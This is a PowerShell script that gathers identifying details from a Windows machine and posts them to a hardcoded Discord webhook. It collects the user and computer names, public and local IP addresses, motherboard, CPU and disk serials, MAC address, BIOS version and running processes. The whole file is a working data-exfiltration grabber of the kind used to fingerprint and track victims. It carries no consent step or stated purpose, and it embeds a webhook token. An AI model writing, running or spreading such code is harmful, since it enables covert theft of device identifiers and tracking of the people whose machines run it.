# ====== CONFIG ======
$webhook = "https://discord.com/api/webhooks/1395999594873360496/gB_Cb_ne-7St_36jupLAaCsRo-KzsEqNxRooJZdzGOVVvWA2WgxXWvlzmizf1FoviCvg"

# ====== BASIC INFO ======
$pc_user = $env:USERNAME
$pc_name = $env:COMPUTERNAME
$run_time = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
$public_ip = Invoke-RestMethod -Uri "https://api.ipify.org"
$local_ip = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object {$_.IPAddress -notlike "169.*"} | Select-Object -First 1).IPAddress
$hwid = (Get-WmiObject Win32_BaseBoard).SerialNumber
$cpu_name = (Get-WmiObject Win32_Processor).Name
$cpu_id = (Get-WmiObject Win32_Processor).ProcessorId
$gpu_name = (Get-WmiObject Win32_VideoController).Name
$ram = [math]::Round((Get-WmiObject Win32_ComputerSystem).TotalPhysicalMemory / 1MB)
$os_name = (Get-WmiObject Win32_OperatingSystem).Caption
$mac = (Get-NetAdapter | Where-Object {$_.Status -eq "Up"} | Select-Object -First 1).MacAddress
$disk_serial = (Get-WmiObject Win32_DiskDrive | Select-Object -First 1).SerialNumber
$bios = (Get-WmiObject Win32_BIOS).SMBIOSBIOSVersion

# ====== RUNNING PROCESSES ======
$processList = Get-Process | Sort-Object ProcessName | Select-Object -ExpandProperty ProcessName
$processString = $processList -join ", "
$shortProcesses = ($processList | Select-Object -First 20) -join ", "
if ($processList.Count -gt 20) {
    $shortProcesses += "`n...and $($processList.Count - 20) more"
}

# ====== CREATE MESSAGE ======
$body = @{
    content = @"
System Info Report
User: $pc_user
PC Name: $pc_name
Run Time: $run_time
Public IP: $public_ip
Local IP: $local_ip
HWID: $hwid
CPU: $cpu_name (ID: $cpu_id)
GPU: $gpu_name
RAM: $ram MB
OS: $os_name
MAC: $mac
Disk Serial: $disk_serial
BIOS: $bios

Running Processes (First 20):
$shortProcesses
"@
} | ConvertTo-Json

# ====== SEND TO DISCORD ======
Invoke-RestMethod -Uri $webhook -Method Post -Body $body -ContentType "application/json"
